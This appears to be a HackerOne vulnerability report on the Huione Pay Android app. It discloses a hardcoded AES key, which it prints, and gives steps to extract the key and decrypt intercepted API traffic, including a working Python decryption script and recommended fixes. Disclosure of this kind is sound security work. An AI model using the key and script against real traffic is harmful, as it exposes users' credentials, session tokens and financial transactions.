# HackerOne Submission — Huione Pay

## Vulnerability Title
Critical: Hardcoded AES-256 Encryption Key Enables Full API Traffic Decryption in Huione Pay Android App

## Severity
**Critical — CVSS 9.8**

## Weakness
CWE-321: Use of Hard-coded Cryptographic Key

---

## Summary

The Huione Pay Android application (`com.huione.pay`) contains a hardcoded AES-256 encryption key embedded in the application binary (`libapp.so`). This key is used to encrypt all API request and response payloads. Any attacker who extracts this key (trivially done via static analysis) can decrypt all intercepted network traffic, including authentication tokens, transaction data, and user financial information — without requiring active MITM capability.

**Hardcoded key:** `keyhead_project_xhui_one_keytail`

This finding is compounded by 17 additional vulnerabilities documented in the full report.

---

## Steps to Reproduce

### Prerequisites
- Android device (rooted) or emulator
- `apktool`, `strings`, Python 3.x with `pycryptodome`
- Burp Suite or mitmproxy

### Step 1 — Extract key from binary
```bash
apktool d com.huione.pay.apk -o huione_decoded
strings huione_decoded/lib/armeabi-v7a/libapp.so | grep -i "keyhead"
# Output: keyhead_project_xhui_one_keytail
```

### Step 2 — Capture encrypted traffic
```bash
# Configure device proxy → Burp Suite
# Navigate to login or any API call
# Copy encrypted request body (base64)
```

### Step 3 — Decrypt captured traffic
```python
from Crypto.Cipher import AES
import base64, urllib.parse

KEY = b"keyhead_project_xhui_one_keytail"
CIPHERTEXT = "<paste base64 from captured traffic>"

raw = base64.b64decode(CIPHERTEXT)
cipher = AES.new(KEY, AES.MODE_ECB)
dec = cipher.decrypt(raw)
pad = dec[-1]
print(urllib.parse.unquote(dec[:-pad].decode("utf-8")))
```

### Step 4 — Observe decrypted plaintext
Output contains full JSON API payload including user credentials, session tokens, and transaction data.

---

## Impact

- **Confidentiality:** Complete — all API traffic decryptable offline
- **Integrity:** High — attacker can re-encrypt modified payloads with same key
- **Authentication:** Compromised — session tokens exposed in decrypted payloads
- **Financial:** Critical — transaction data fully visible and modifiable

---

## Supporting Evidence

- Binary analysis of `libapp.so` confirming key presence
- Successful decryption of live API traffic sample
- Timestamped HTTP evidence capture (attached)

---

## Recommended Fix

1. Remove hardcoded key from binary immediately
2. Implement server-side session key derivation (HKDF + server entropy)
3. Switch from AES-ECB to AES-GCM (authenticated encryption)
4. Implement request signing with per-session asymmetric keys

---

## Additional Vulnerabilities

This submission focuses on VULN-001. A full report covering 17 additional vulnerabilities (IDOR, OTP bypass, SSL pinning, device spoofing, blockchain C2 infrastructure) is available at:

[Full Report](../../VULNERABILITY_REPORT.md)

---

*Submitted in accordance with HackerOne responsible disclosure policy.*
*No user data was accessed. All testing conducted on isolated test environment.*
